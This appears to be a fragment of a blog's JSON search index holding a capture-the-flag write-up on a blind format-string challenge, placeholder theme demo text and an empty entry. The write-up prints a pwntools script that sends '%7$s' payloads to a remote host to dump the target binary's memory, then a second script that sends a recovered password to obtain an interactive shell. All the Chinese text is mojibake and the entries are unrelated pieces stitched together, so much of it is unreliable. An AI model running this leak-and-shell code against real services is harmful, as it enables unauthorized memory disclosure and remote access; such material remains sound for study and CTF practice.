fmtç›²æ‰“ï¼Œä»ç½‘ä¸Šæœäº†ä¸€ä¸‹éœ€è¦å…ˆdumpæ–‡ä»¶å†…å®¹ï¼Œæ¨¡ä»¿äº†ä¸€ä¸ªè„šæœ¬å¦‚ä¸‹ï¼Œä»0x40000å¼€å§‹æ³„éœ²\nä½†æ˜¯æ³„éœ²çš„elfæ–‡ä»¶ä¸å®Œæ•´ï¼Œäºæ˜¯åˆä¸Šç½‘æœ å‘ç°\nè¿™æ ·è®¾ç½®çš„è¯å¯ä»¥æ‰“å¼€æ–‡ä»¶\nè¯»æ±‡ç¼–å‘ç°name=y0u_kn0w_c6c?çš„æ—¶å€™è·å¾—shell\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 import os import sys import time from pwn import * from ctypes import * import binascii context.os = \u0026#39;linux\u0026#39; context.log_level = \u0026#34;debug\u0026#34; x64_32 = 1 if x64_32: context.arch = \u0026#39;amd64\u0026#39; else: context.arch = \u0026#39;i386\u0026#39; # å¢åŠ è¶…æ—¶è®¾ç½®ï¼Œé˜²æ­¢æ— é™ç­‰å¾… p = remote(\u0026#39;192.168.248.1\u0026#39;, 58731, timeout=5) begin = 0x400000 bin_data = b\u0026#39;\u0026#39; def leak(addr): \u0026#34;\u0026#34;\u0026#34; å°è¯•æ³„éœ²æŒ‡å®šåœ°å€çš„æ•°æ®ã€‚ å¦‚æœæˆåŠŸï¼Œè¿”å›æ³„éœ²çš„æ•°æ®ï¼ˆä¸å«\u0026#39;dump\u0026#39;ï¼‰ã€‚ å¦‚æœå¤±è´¥ï¼ˆè¶…æ—¶æˆ–è¿æ¥å…³é—­ï¼‰ï¼Œè¿”å› Noneã€‚ \u0026#34;\u0026#34;\u0026#34; try: pl = b\u0026#34;%7$sdump\u0026#34; + p64(addr) p.sendafter(b\u0026#39;Please enter your answer\\n\u0026#39;, pl) data = p.recvuntil(b\u0026#39;dump\u0026#39;, drop=True) return data except (pwnlib.exception.PwnlibTimeoutError, EOFError): return None try: while True: print(f\u0026#34;[*] Trying to leak address: 0x{begin:016x}\u0026#34;) data = leak(begin) if data is None: # å¦‚æœ leak è¿”å› Noneï¼Œè¯´æ˜å·²ç»æ²¡æœ‰æ•°æ®å¯ä»¥è¯»å–äº† print(\u0026#34;[!] No more data received. Exiting loop.\u0026#34;) break if not data: # å¦‚æœè¿”å›ç©ºå­—èŠ‚ä¸² b\u0026#39;\u0026#39; # è¿™é€šå¸¸æ„å‘³ç€æ³„éœ²çš„å°±æ˜¯ç©ºæ•°æ® bin_data += b\u0026#39;\\x00\u0026#39; begin += 1 else: bin_data += data begin += len(data) except Exception as e: print(f\u0026#34;[!] An error occurred: {e}\u0026#34;) finally: print(f\u0026#39;[+] Dump finished. Total length: {len(bin_data)} bytes.\u0026#39;) with open(\u0026#39;dump_bin\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(bin_data) # å°è¯•å…³é—­è¿æ¥ try: p.close() except: pass from pwn import * p = remote(\u0026#39;192.168.248.1\u0026#39;, 58731) p.recvuntil(b\u0026#39;Please enter your answer\u0026#39;) p.send(b\u0026#39;y0u_kn0w_c6c?\u0026#39;) p.interactive() ","date":"0001-01-01T00:00:00Z","permalink":"http://localhost:1313/p/","title":""},{"content":" æ­£æ–‡æµ‹è¯• è€Œè¿™äº›å¹¶ä¸æ˜¯å®Œå…¨é‡è¦ï¼Œæ›´åŠ é‡è¦çš„é—®é¢˜æ˜¯ï¼Œ å¸¦ç€è¿™äº›é—®é¢˜ï¼Œæˆ‘ä»¬æ¥å®¡è§†ä¸€ä¸‹å­¦ç”Ÿä¼šé€€ä¼šã€‚ æ—¢ç„¶å¦‚ä½•ï¼Œ å¯¹æˆ‘ä¸ªäººè€Œè¨€ï¼Œå­¦ç”Ÿä¼šé€€ä¼šä¸ä»…ä»…æ˜¯ä¸€ä¸ªé‡å¤§çš„äº‹ä»¶ï¼Œè¿˜å¯èƒ½ä¼šæ”¹å˜æˆ‘çš„äººç”Ÿã€‚ æˆ‘ä»¬ä¸å¾—ä¸é¢å¯¹ä¸€ä¸ªéå¸¸å°´å°¬çš„äº‹å®ï¼Œé‚£å°±æ˜¯ï¼Œ å¯æ˜¯ï¼Œå³ä½¿æ˜¯è¿™æ ·ï¼Œå­¦ç”Ÿä¼šé€€ä¼šçš„å‡ºç°ä»ç„¶ä»£è¡¨äº†ä¸€å®šçš„æ„ä¹‰ã€‚ å­¦ç”Ÿä¼šé€€ä¼šï¼Œå‘ç”Ÿäº†ä¼šå¦‚ä½•ï¼Œä¸å‘ç”Ÿåˆä¼šå¦‚ä½•ã€‚ ç»è¿‡ä¸Šè¿°è®¨è®ºï¼Œ ç”Ÿæ´»ä¸­ï¼Œè‹¥å­¦ç”Ÿä¼šé€€ä¼šå‡ºç°äº†ï¼Œæˆ‘ä»¬å°±ä¸å¾—ä¸è€ƒè™‘å®ƒå‡ºç°äº†çš„äº‹å®ã€‚ å­¦ç”Ÿä¼šé€€ä¼šï¼Œåˆ°åº•åº”è¯¥å¦‚ä½•å®ç°ã€‚ è¿™æ ·çœ‹æ¥ï¼Œ åœ¨è¿™ç§å›°éš¾çš„æŠ‰æ‹©ä¸‹ï¼Œæœ¬äººæ€æ¥æƒ³å»ï¼Œå¯é£Ÿéš¾å®‰ã€‚ å¯¹æˆ‘ä¸ªäººè€Œè¨€ï¼Œå­¦ç”Ÿä¼šé€€ä¼šä¸ä»…ä»…æ˜¯ä¸€ä¸ªé‡å¤§çš„äº‹ä»¶ï¼Œè¿˜å¯èƒ½ä¼šæ”¹å˜æˆ‘çš„äººç”Ÿã€‚ å°±æˆ‘ä¸ªäººæ¥è¯´ï¼Œå­¦ç”Ÿä¼šé€€ä¼šå¯¹æˆ‘çš„æ„ä¹‰ï¼Œä¸èƒ½ä¸è¯´éå¸¸é‡å¤§ã€‚ èå£«æ¯”äºšæ›¾ç»æåˆ°è¿‡ï¼Œäººçš„ä¸€ç”Ÿæ˜¯çŸ­çš„ï¼Œä½†å¦‚æœå‘åŠ£åœ°è¿‡è¿™ä¸€ç”Ÿï¼Œå°±å¤ªé•¿äº†ã€‚è¿™ä¼¼ä¹è§£ç­”äº†æˆ‘çš„ç–‘æƒ‘ã€‚ è«æ‰ç‰¹è¯´è¿‡ä¸€å¥å¯Œæœ‰å“²ç†çš„è¯ï¼Œè°å’Œæˆ‘ä¸€æ ·ç”¨åŠŸï¼Œè°å°±ä¼šå’Œæˆ‘ä¸€æ ·æˆåŠŸã€‚è¿™å¯å‘äº†æˆ‘ï¼Œ å¯¹æˆ‘ä¸ªäººè€Œè¨€ï¼Œå­¦ç”Ÿä¼šé€€ä¼šä¸ä»…ä»…æ˜¯ä¸€ä¸ªé‡å¤§çš„äº‹ä»¶ï¼Œè¿˜å¯èƒ½ä¼šæ”¹å˜æˆ‘çš„äººç”Ÿã€‚ å­¦ç”Ÿä¼šé€€ä¼šï¼Œåˆ°åº•åº”è¯¥å¦‚ä½•å®ç°ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œ ä»è¿™ä¸ªè§’åº¦æ¥çœ‹ï¼Œ è¿™ç§äº‹å®å¯¹æœ¬äººæ¥è¯´æ„ä¹‰é‡å¤§ï¼Œç›¸ä¿¡å¯¹è¿™ä¸ªä¸–ç•Œä¹Ÿæ˜¯æœ‰ä¸€å®šæ„ä¹‰çš„ã€‚ åœ¨è¿™ç§å›°éš¾çš„æŠ‰æ‹©ä¸‹ï¼Œæœ¬äººæ€æ¥æƒ³å»ï¼Œå¯é£Ÿéš¾å®‰ã€‚ äº†è§£æ¸…æ¥šå­¦ç”Ÿä¼šé€€ä¼šåˆ°åº•æ˜¯ä¸€ç§æ€ä¹ˆæ ·çš„å­˜åœ¨ï¼Œæ˜¯è§£å†³ä¸€åˆ‡é—®é¢˜çš„å…³é”®ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œ ç”Ÿæ´»ä¸­ï¼Œè‹¥å­¦ç”Ÿä¼šé€€ä¼šå‡ºç°äº†ï¼Œæˆ‘ä»¬å°±ä¸å¾—ä¸è€ƒè™‘å®ƒå‡ºç°äº†çš„äº‹å®ã€‚ é—®é¢˜çš„å…³é”®ç©¶ç«Ÿä¸ºä½•ï¼Ÿ è€Œè¿™äº›å¹¶ä¸æ˜¯å®Œå…¨é‡è¦ï¼Œæ›´åŠ é‡è¦çš„é—®é¢˜æ˜¯ã€‚\nå¥¥æ–¯ç‰¹æ´›å¤«æ–¯åŸºæ›¾ç»è¯´è¿‡ï¼Œå…±åŒçš„äº‹ä¸šï¼Œå…±åŒçš„æ–—äº‰ï¼Œå¯ä»¥ä½¿äººä»¬äº§ç”Ÿå¿å—ä¸€åˆ‡çš„åŠ›é‡ã€‚ã€€å¸¦ç€è¿™å¥è¯ï¼Œæˆ‘ä»¬è¿˜è¦æ›´åŠ æ…é‡çš„å®¡è§†è¿™ä¸ªé—®é¢˜ï¼š ä¸€èˆ¬æ¥è®²ï¼Œæˆ‘ä»¬éƒ½å¿…é¡»åŠ¡å¿…æ…é‡çš„è€ƒè™‘è€ƒè™‘ã€‚ æ—¢ç„¶å¦‚æ­¤ï¼Œ è¿™ç§äº‹å®å¯¹æœ¬äººæ¥è¯´æ„ä¹‰é‡å¤§ï¼Œç›¸ä¿¡å¯¹è¿™ä¸ªä¸–ç•Œä¹Ÿæ˜¯æœ‰ä¸€å®šæ„ä¹‰çš„ã€‚ å¸¦ç€è¿™äº›é—®é¢˜ï¼Œæˆ‘ä»¬æ¥å®¡è§†ä¸€ä¸‹å­¦ç”Ÿä¼šé€€ä¼šã€‚ æˆ‘è®¤ä¸ºï¼Œ æˆ‘è®¤ä¸ºï¼Œ åœ¨è¿™ç§å›°éš¾çš„æŠ‰æ‹©ä¸‹ï¼Œæœ¬äººæ€æ¥æƒ³å»ï¼Œå¯é£Ÿéš¾å®‰ã€‚ é—®é¢˜çš„å…³é”®ç©¶ç«Ÿä¸ºä½•ï¼Ÿ æ¯ä¸ªäººéƒ½ä¸å¾—ä¸é¢å¯¹è¿™äº›é—®é¢˜ã€‚ åœ¨é¢å¯¹è¿™ç§é—®é¢˜æ—¶ï¼Œ è¦æƒ³æ¸…æ¥šï¼Œå­¦ç”Ÿä¼šé€€ä¼šï¼Œåˆ°åº•æ˜¯ä¸€ç§æ€ä¹ˆæ ·çš„å­˜åœ¨ã€‚ æˆ‘è®¤ä¸ºï¼Œ æ—¢ç„¶å¦‚æ­¤ï¼Œ æ¯ä¸ªäººéƒ½ä¸å¾—ä¸é¢å¯¹è¿™äº›é—®é¢˜ã€‚ åœ¨é¢å¯¹è¿™ç§é—®é¢˜æ—¶ï¼Œ é‚£ä¹ˆï¼Œ æˆ‘è®¤ä¸ºï¼Œ å­¦ç”Ÿä¼šé€€ä¼šå› ä½•è€Œå‘ç”Ÿã€‚\nå¼•ç”¨ æ€å¿µæ˜¯æœ€æš–çš„å¿§ä¼¤åƒä¸€åŒç¿…è†€\nè®©æˆ‘åœä¸äº†é£ä¸è¿œåœ¨è¿‡å¾€æ¸¸è¡\nä¸å‘Šè€Œåˆ«çš„ä½  å°±ç®—ä¸ºäº†æˆ‘ç€æƒ³\nè¿™ä¹ˆæ²‰ç—›çš„å‘µæŠ¤ æˆ‘æ€ä¹ˆèƒ½ç¿±ç¿”\næœ€æš–çš„æ†‚å‚· - ç”°é¦¥ç”„\nå›¾ç‰‡ 1 2 3 ![Photo by Florian Klauer on Unsplash](florian-klauer-nptLmg6jqDo-unsplash.jpg) ![Photo by Luca Bravo on Unsplash](luca-bravo-alS7ewQ41M8-unsplash.jpg) ![Photo by Helena Hertz on Unsplash](helena-hertz-wWZzXlDpMog-unsplash.jpg) ![Photo by Hudai Gayiran on Unsplash](hudai-gayiran-3Od_VKcDEAA-unsplash.jpg) ç›¸å†Œè¯­æ³•æ¥è‡ª Typlog\n","date":"0001-01-01T00:00:00Z","permalink":"http://localhost:1313/p/","title":""},{"content":" ","date":"0001-01-01T00:00:00Z","permalink":"http://localhost:1313/p/","title":""}]